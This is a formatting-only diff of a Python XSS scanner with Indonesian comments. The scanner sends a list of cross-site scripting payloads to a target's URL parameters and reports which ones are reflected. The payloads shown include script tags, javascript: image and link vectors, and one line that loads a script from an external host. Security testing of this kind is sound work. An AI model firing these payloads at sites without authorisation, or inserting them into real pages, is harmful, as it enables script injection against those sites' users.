@@ -4,12 +4,12 @@ XSS Scanner - Reflected and Stored XSS detection
 Menguji parameter URL untuk kerentanan Cross-Site Scripting.
 Usage: python xss_scanner.py -u "http://target.com/search?q=test"
 """
+
 import requests
 import argparse
 import sys
 import re
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
-
 
 XSS_PAYLOADS = [
     "<script>alert('XSS')</script>",
@@ -25,7 +25,7 @@ XSS_PAYLOADS = [
     "<IMG SRC=\"javascript:alert('XSS');\">",
     "<IMG SRC=javascript:alert('XSS')>",
     "<IMG SRC=JaVaScRiPt:alert('XSS')>",
-    "<IMG SRC=`javascript:alert(\"XSS\")`>",
+    '<IMG SRC=`javascript:alert("XSS")`>',
     "<a href=\"javascript:alert('XSS')\">click</a>",
     "'';!--\"<XSS>=&{()}",
     "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
@@ -59,7 +59,7 @@ def is_reflected(response_text, payload):
     if payload in response_text:
         return True
     # Check URL-decoded version
-    decoded = payload.replace("&quot;", "\"").replace("&amp;", "&")
+    decoded = payload.replace("&quot;", '"').replace("&amp;", "&")
     if decoded in response_text:
         return True
     return False
@@ -76,12 +76,14 @@ def test_reflected_xss(session, url, params):
             try:
                 r = session.get(test_url, timeout=10)
                 if is_reflected(r.text, payload):
-                    findings.append({
-                        "type": "Reflected XSS",
-                        "url": test_url,
-                        "parameter": param_name,
-                        "payload": payload,
-                    })
+                    findings.append(
+                        {
+                            "type": "Reflected XSS",
+                            "url": test_url,
+                            "parameter": param_name,
+                            "payload": payload,
+                        }
+                    )
                     return findings
             except requests.exceptions.RequestException:
                 continue
@@ -158,4 +160,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
